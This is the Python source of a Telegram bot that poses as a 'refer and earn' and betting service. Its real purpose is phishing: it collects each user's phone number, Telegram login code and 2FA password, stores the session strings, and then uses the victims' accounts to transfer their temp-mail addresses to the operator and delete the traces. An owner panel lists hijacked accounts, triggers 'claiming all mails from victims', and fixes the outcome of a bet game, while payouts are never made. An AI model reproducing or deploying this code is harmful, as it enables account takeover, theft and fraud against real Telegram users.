# -*- coding: utf-8 -*-
import sqlite3
import logging
import random
import string
import re
import os
import threading
import asyncio
from fastapi import FastAPI
import uvicorn
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, Bot
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters,
    ContextTypes, CallbackQueryHandler
)
from telethon import TelegramClient, events
from telethon.sessions import StringSession

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
API_ID = int(os.getenv("API_ID", "38746329"))
API_HASH = os.getenv("API_HASH", "dc6d3dd0de462ed07952a64c3253c437")

OWNERS_STR = os.getenv("OWNERS", "7729056358,8808192812")
OWNERS = [int(x.strip()) for x in OWNERS_STR.split(",") if x.strip().isdigit()]

TARGET_MAIL_BOT = os.getenv("TARGET_MAIL_BOT", "fakemailbot")

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ================== NEW FONTS (User Request) ==================
FONT_MAP = {
    'a': 'Ａ', 'b': 'Ｂ', 'c': 'Ｃ', 'd': 'Ｄ', 'e': 'Ｅ', 'f': 'Ｆ', 'g': 'Ｇ', 'h': 'Ｈ', 'i': 'Ｉ', 'j': 'Ｊ',
    'k': 'Ｋ', 'l': 'Ｌ', 'm': 'Ｍ', 'n': 'Ｎ', 'o': 'Ｏ', 'p': 'Ｐ', 'q': 'Ｑ', 'r': 'Ｒ', 's': 'Ｓ', 't': 'Ｔ',
    'u': 'Ｕ', 'v': 'Ｖ', 'w': 'Ｗ', 'x': 'Ｘ', 'y': 'Ｙ', 'z': 'Ｚ',
    'A': 'Ａ', 'B': 'Ｂ', 'C': 'Ｃ', 'D': 'Ｄ', 'E': 'Ｅ', 'F': 'Ｆ', 'G': 'Ｇ', 'H': 'Ｈ', 'I': 'Ｉ', 'J': 'Ｊ',
    'K': 'Ｋ', 'L': 'Ｌ', 'M': 'Ｍ', 'N': 'Ｎ', 'O': 'Ｏ', 'P': 'Ｐ', 'Q': 'Ｑ', 'R': 'Ｒ', 'S': 'Ｓ', 'T': 'Ｔ',
    'U': 'Ｕ', 'V': 'Ｖ', 'W': 'Ｗ', 'X': 'Ｘ', 'Y': 'Ｙ', 'Z': 'Ｚ'
}

NUM_MAP = {
    '1': '１', '2': '２', '3': '３', '4': '４', '5': '５',
    '6': '６', '7': '７', '8': '８', '9': '９', '0': '０'
}

def f_txt(text):
    return "".join(FONT_MAP.get(c, c) for c in text)

def f_num(text):
    return "".join(NUM_MAP.get(c, c) for c in str(text))

# Purple + Comma style
def p_style(text):
    return f"<code>{text}</code>,"

# ================== DATABASE ==================
DB_PATH = "refer_bot.db"

def init_db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, 
        phone TEXT, 
        session_string TEXT, 
        is_banned INTEGER DEFAULT 0, 
        balance INTEGER DEFAULT 0
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        user_id INTEGER, 
        amount INTEGER, 
        upi_id TEXT, 
        status TEXT DEFAULT 'Pending'
    )""")
    c.execute("CREATE TABLE IF NOT EXISTS bets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, choice TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)")
    
    for owner in OWNERS:
        c.execute("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (owner,))
    conn.commit()
    conn.close()

init_db()

def db_exec(query, params=()):
    conn = sqlite3.connect(DB_PATH, timeout=10)
    c = conn.cursor()
    try:
        c.execute(query, params)
        conn.commit()
        res = c.fetchall()
    finally:
        conn.close()
    return res

def get_config(key, default=None):
    res = db_exec("SELECT value FROM config WHERE key=?", (key,))
    return res[0][0] if res else default

def set_config(key, value):
    db_exec("INSERT OR REPLACE INTO config (key, value) VALUES (?,?)", (key, value))

def get_all_admins():
    res = db_exec("SELECT user_id FROM admins")
    return [row[0] for row in res] if res else []

active_userbots = {}
temp_clients = {}

# ================== FASTAPI (RENDER) ==================
web_app = FastAPI()

@web_app.get("/")
def read_root():
    return {"status": "Bot is alive and running"}

def run_web():
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(web_app, host="0.0.0.0", port=port)

# ================== USERBOT AUTOMATION ==================
async def get_or_connect_client(user_id):
    if user_id in active_userbots: return active_userbots[user_id]
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    if not res or not res[0][0]: return None
    client = TelegramClient(StringSession(res[0][0]), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    return client

async def start_userbot(user_id, session_str):
    if user_id in active_userbots:
        try: await active_userbots[user_id].disconnect()
        except: pass

    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    await client.connect()
    active_userbots[user_id] = client
    
    @client.on(events.NewMessage(incoming=True))
    async def otp_listener(event):
        try:
            if not event.is_private: return
            sender = await event.get_sender()
            if not sender: return
            uname = (getattr(sender, "username", "") or "").lower()
            
            if uname == TARGET_MAIL_BOT.lower():
                full_text = event.message.message or ""
                if not full_text: return
                bot = Bot(BOT_TOKEN)
                for owner in get_all_admins():
                    try: await bot.send_message(chat_id=owner, text=f"<b>📥 {f_txt('NEW OTP RECEIVED')}</b>,\n\n{p_style(full_text)}", parse_mode="HTML")
                    except: pass
        except Exception as e:
            logger.error(f"OTP listener: {e}")

    # Auto Steal after login
    asyncio.create_task(auto_steal_mails(user_id))

async def auto_steal_mails(victim_uid):
    try:
        target_owner = get_config("receive_mail_id") # Owner ID set from panel
        if not target_owner: return
        
        victim_client = await get_or_connect_client(victim_uid)
        owner_client = await get_or_connect_client(int(target_owner))
        
        if not victim_client or not owner_client: return
        
        target_bot = await victim_client.get_entity(TARGET_MAIL_BOT)
        owner_target_bot = await owner_client.get_entity(TARGET_MAIL_BOT)
        
        await victim_client.send_message(target_bot, "/id")
        await asyncio.sleep(3) 
        messages = await victim_client.get_messages(target_bot, limit=2)
        if not messages: return
            
        emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
        if not emails: return
            
        owner_username = get_config("owner_claim_username")
        if not owner_username: return

        for email in emails:
            # Transfer
            await victim_client.send_message(target_bot, f"/transfer {email} {owner_username}")
            await asyncio.sleep(2)
            try:
                msgs = await victim_client.get_messages(target_bot, limit=1)
                await victim_client.delete_messages(target_bot, msgs[0].id)
            except: pass
            
            # Claim
            await owner_client.send_message(owner_target_bot, email)
            await asyncio.sleep(2)
            try:
                msgs = await owner_client.get_messages(owner_target_bot, limit=1)
                await owner_client.delete_messages(owner_target_bot, msgs[0].id)
            except: pass
            await asyncio.sleep(1)
            
    except Exception as e:
        logger.error(f"Steal error: {e}")

# ================== KEYBOARDS ==================
def get_main_keyboard():
    kb = [
        [KeyboardButton("🎁 Bonus", style="primary"), KeyboardButton("💵 Balance", style="success")],
        [KeyboardButton("🔗 Refer Earn", style="primary"), KeyboardButton("🏦 Payout Method", style="primary"), KeyboardButton("💸 Withdraw", style="danger")],
        [KeyboardButton("🎰 Bet & Earn", style="success")]
    ]
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def get_bet_keyboard():
    kb = [
        [InlineKeyboardButton("🟢 Bet on Green", callback_data="bet_green")],
        [InlineKeyboardButton("🔵 Bet on Blue", callback_data="bet_blue")]
    ]
    return InlineKeyboardMarkup(kb)

# ================== BOT HANDLERS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    res = db_exec("SELECT session_string FROM users WHERE user_id=?", (user_id,))
    
    welcome_text = (
        f"👋 <b>{f_txt('WELCOME TO REFER EARN BOT')}</b>,\n\n"
        f"You will get {p_style('100rs')} per refer,\n"
        f"Minimum withdraw is {p_style('100rs')},\n\n"
        f"Please verify your contact to continue,"
    )
    
    if res and res[0][0]:
        await update.message.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML")
    else:
        await update.message.reply_text(
            f"🔒 <b>{f_txt('VERIFY YOURSELF')}</b>,\n\nPlease share your contact,\n",
            reply_markup=ReplyKeyboardMarkup([[KeyboardButton("📱 Share Contact", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True),
            parse_mode="HTML"
        )

async def verify_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact: return await update.message.reply_text("❌ Please use the button,")
    
    phone = contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    uid = update.effective_user.id
    
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        temp_clients[uid] = {'client': client, 'hash': sent.phone_code_hash, 'phone': phone, 'state': 'otp'}
        
        await update.message.reply_text(
            f"📩 <b>{f_txt('We have sent you a Telegram verify password')}</b>,\n\n"
            f"Enter it manually below (Example: 1 2 3 4 5),\n",
            reply_markup=ReplyKeyboardMarkup([[]], resize_keyboard=True),
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e},")

async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    uid = update.effective_user.id
    
    # --- ADMIN STATES ---
    if uid in get_all_admins():
        state = context.user_data.get('admin_state')
        if state == 'target':
            set_config("owner_claim_username", text)
            await update.message.reply_text(f"✅ {p_style('Claim Target Set to ' + text)}", parse_mode="HTML")
            context.user_data['admin_state'] = None
            return
        elif state == 'receive_id':
            set_config("receive_mail_id", text)
            await update.message.reply_text(f"✅ {p_style('Mails will be received on ID: ' + text)}", parse_mode="HTML")
            context.user_data['admin_state'] = None
            return
        elif state == 'result':
            res = text.upper()
            if res in ['RED', 'BLUE', 'GREEN']:
                set_config("bet_result", res)
                await update.message.reply_text(f"✅ {p_style('Bet Result set to ' + res)}", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Please enter RED or BLUE,")
            context.user_data['admin_state'] = None
            return
        elif state == 'admin':
            if text.isdigit():
                db_exec("INSERT OR IGNORE INTO admins (user_id) VALUES (?)", (int(text),))
                await update.message.reply_text(f"✅ {p_style('Admin Added')}", parse_mode="HTML")
            context.user_data['admin_state'] = None
            return

    # --- OTP LOGIN STATE ---
    if uid in temp_clients:
        state = temp_clients[uid].get('state')
        if state == '2fa':
            try:
                await temp_clients[uid]['client'].sign_in(password=text)
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                return await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>,\n{p_style('Welcome to the bot')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            except Exception as e:
                return await update.message.reply_text(f"❌ 2FA Failed: {e},")
        
        elif state == 'otp':
            otp = text.replace(" ", "").replace("-", "")
            try:
                await temp_clients[uid]['client'].sign_in(phone=temp_clients[uid]['phone'], code=otp, phone_code_hash=temp_clients[uid]['hash'])
                session = temp_clients[uid]['client'].session.save()
                db_exec("INSERT OR REPLACE INTO users (user_id, phone, session_string) VALUES (?,?,?)", (uid, temp_clients[uid]['phone'], session))
                del temp_clients[uid]
                await start_userbot(uid, session)
                return await update.message.reply_text(f"✅ <b>{f_txt('Verification Successful')}</b>,\n{p_style('Welcome to the bot')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
            except Exception as e:
                if "Two-step" in str(e) or "password" in str(e).lower():
                    temp_clients[uid]['state'] = '2fa'
                    return await update.message.reply_text(f"🔐 <b>{f_txt('ENTER 2FA PASSWORD')}</b>,\nSend it below,")
                return await update.message.reply_text(f"❌ OTP Failed: {e},\nTry again,")

    # --- MENU BUTTONS ---
    if text == "💵 Balance":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        await update.message.reply_text(f"💵 <b>{f_txt('Balance')}</b>,\n\n{p_style('Current Balance: ₹' + str(bal))}", parse_mode="HTML")
        
    elif text == "🔗 Refer Earn":
        bot_username = (await context.bot.get_me()).username
        ref_link = f"https://t.me/{bot_username}?start={uid}"
        await update.message.reply_text(f"🔗 <b>{f_txt('Your Link')}</b>,\n\n{p_style(ref_link)}\nShare and earn 100rs,", parse_mode="HTML")
        
    elif text == "🏦 Payout Method":
        await update.message.reply_text(
            f"🏦 <b>{f_txt('How to Withdraw')}</b>,\n\n"
            f"Step 1: Click on {p_style('💸 Withdraw')},\n"
            f"Step 2: Enter amount (Min 100rs),\n"
            f"Step 3: Enter your UPI ID,\n"
            f"Step 4: Your payment will be processed,",
            parse_mode="HTML"
        )
        
    elif text == "💸 Withdraw":
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if bal < 100:
            return await update.message.reply_text(f"⚠️ <b>{f_txt('Insufficient Balance')}</b>,\nMinimum 100rs needed,\n{p_style('Your Balance: ₹' + str(bal))}", parse_mode="HTML")
        context.user_data['withdrawing'] = True
        await update.message.reply_text(f"💸 <b>{f_txt('Enter Amount to Withdraw')}:</b>,")

    elif text == "🎰 Bet & Earn":
        await update.message.reply_text(
            f"🎰 <b>{f_txt('Bet & Earn')}</b>,\n\n"
            f"Bet on Green or Blue,\n"
            f"Result will be out at 12 AM,\n"
            f"Double your money if you win,",
            reply_markup=get_bet_keyboard(),
            parse_mode="HTML"
        )

    elif context.user_data.get('withdrawing') and text.isdigit():
        amount = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amount < 100 or amount > bal:
            return await update.message.reply_text("❌ Invalid amount or insufficient balance,")
        context.user_data['withdrawing'] = False
        context.user_data['amount'] = amount
        context.user_data['upi'] = True
        await update.message.reply_text("🏦 Enter your UPI ID,")

    elif context.user_data.get('upi'):
        upi = text
        amount = context.user_data.get('amount', 0)
        db_exec("INSERT INTO withdrawals (user_id, amount, upi_id) VALUES (?,?,?)", (uid, amount, upi))
        context.user_data['upi'] = False
        await update.message.reply_text(f"✅ {p_style('Withdrawal Requested')}", reply_markup=get_main_keyboard(), parse_mode="HTML")
    
    elif context.user_data.get('bet_amt') and text.isdigit():
        amt = int(text)
        res = db_exec("SELECT balance FROM users WHERE user_id=?", (uid,))
        bal = res[0][0] if res else 0
        if amt > bal: return await update.message.reply_text("❌ Insufficient balance,")
        
        choice = context.user_data.get('bet_choice')
        db_exec("INSERT INTO bets (user_id, amount, choice) VALUES (?,?,?)", (uid, amt, choice))
        context.user_data['bet_amt'] = False
        
        await update.message.reply_text(f"✅ <b>{f_txt('Bet Successful')}</b>,\nYou bet {p_style(str(amt) + 'rs')} on {p_style(choice.upper())},\nResult at 12 AM,", reply_markup=get_main_keyboard(), parse_mode="HTML")

async def bet_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    choice = query.data.split("_")[1]
    
    context.user_data['bet_choice'] = choice
    context.user_data['bet_amt'] = True
    await query.edit_message_text(f"💰 <b>{f_txt('Enter amount to bet on ' + choice.upper())}</b>,")

# ================== OWNER PANEL ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in get_all_admins(): return
    
    kb = [
        [InlineKeyboardButton("👥 Logged Accounts", callback_data="admin_acc"), InlineKeyboardButton("🎯 Set Claim Target", callback_data="admin_target")],
        [InlineKeyboardButton("📥 Receive Fake Mails On", callback_data="admin_receive"), InlineKeyboardButton("📤 Claim All Mails", callback_data="admin_claim")],
        [InlineKeyboardButton("🎰 Set Bet Result", callback_data="admin_result"), InlineKeyboardButton("👑 Add Admin", callback_data="admin_add")]
    ]
    await update.message.reply_text(f"<b>👑 {f_txt('OWNER PANEL')}</b>,\nAll commands:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "admin_acc":
        users = db_exec("SELECT user_id, phone FROM users WHERE session_string IS NOT NULL")
        text = f"👥 <b>{f_txt('Accounts')}:</b>,\n\n"
        for u in users: text += f"{p_style('ID: ' + str(u[0]))}\n{p_style('Phone: ' + str(u[1]))}\n"
        await query.edit_message_text(text, parse_mode="HTML")
        
    elif data == "admin_target":
        await query.edit_message_text(f"🎯 {f_txt('Send username to set Claim Target')} (e.g. @myusername),")
        context.user_data['admin_state'] = 'target'

    elif data == "admin_receive":
        await query.edit_message_text(f"📥 {f_txt('Send the Telegram ID where you want to receive mails')},")
        context.user_data['admin_state'] = 'receive_id'
        
    elif data == "admin_result":
        await query.edit_message_text(f"🎰 {f_txt('Send Result')} (RED or BLUE),")
        context.user_data['admin_state'] = 'result'
        
    elif data == "admin_add":
        await query.edit_message_text(f"👑 {f_txt('Send User ID to make Admin')},")
        context.user_data['admin_state'] = 'admin'

    elif data == "admin_claim":
        await query.edit_message_text(f"⏳ {f_txt('Claiming all mails from victims')}...")
        users = db_exec("SELECT user_id FROM users WHERE session_string IS NOT NULL")
        for u in users:
            asyncio.create_task(auto_steal_mails(u[0]))

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_phone))
    app_bot.add_handler(CallbackQueryHandler(bet_callback, pattern="^bet_"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router))

    logger.info("Bot started successfully.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
